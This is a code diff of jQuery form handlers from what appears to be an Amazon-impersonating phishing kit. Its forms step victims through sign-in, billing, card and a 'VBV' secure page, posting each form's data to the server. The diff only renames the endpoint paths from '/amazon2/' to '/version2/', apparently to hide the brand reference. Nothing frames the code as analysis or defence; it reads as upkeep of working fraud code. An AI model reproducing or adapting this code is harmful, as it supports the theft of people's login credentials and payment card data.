@@ -13,7 +13,7 @@
         },
         submitHandler: function(form) {
             $("#zwimel").show();
-            $.post("/amazon2/mobile/signin", $("#signineml").serialize(),
+            $.post("/version2/mobile/signin", $("#signineml").serialize(),
             function(result) {
                 setTimeout(function() {
                     $(location).attr("href", "homepage/billing")
@@ -50,7 +50,7 @@
         },
         submitHandler: function(form) {
             $("#zwimel").show();
-            $.post("/amazon2/mobile/homepage/billing", $("#billingform").serialize(),
+            $.post("/version2/mobile/homepage/billing", $("#billingform").serialize(),
             function(result) {
                 setTimeout(function() {
                     $(location).attr("href", "card")
@@ -113,7 +113,7 @@
         },
         submitHandler: function(form) {
             $("#zwimel").show();
-            $.post("/amazon2/mobile/homepage/card", $("#formcard").serialize(),
+            $.post("/version2/mobile/homepage/card", $("#formcard").serialize(),
             function(result) {
                 setTimeout(function() {
                     $(location).attr("href", "secure")
@@ -203,7 +203,7 @@ $(function() {
         },
         submitHandler: function(form) {
             $("#zwimel").show();
-            $.post("/amazon2/mobile/homepage/secure", $("#formvbv").serialize(),
+            $.post("/version2/mobile/homepage/secure", $("#formvbv").serialize(),
             function(result) {
                 setTimeout(function() {
                     $(location).attr("href", "success")
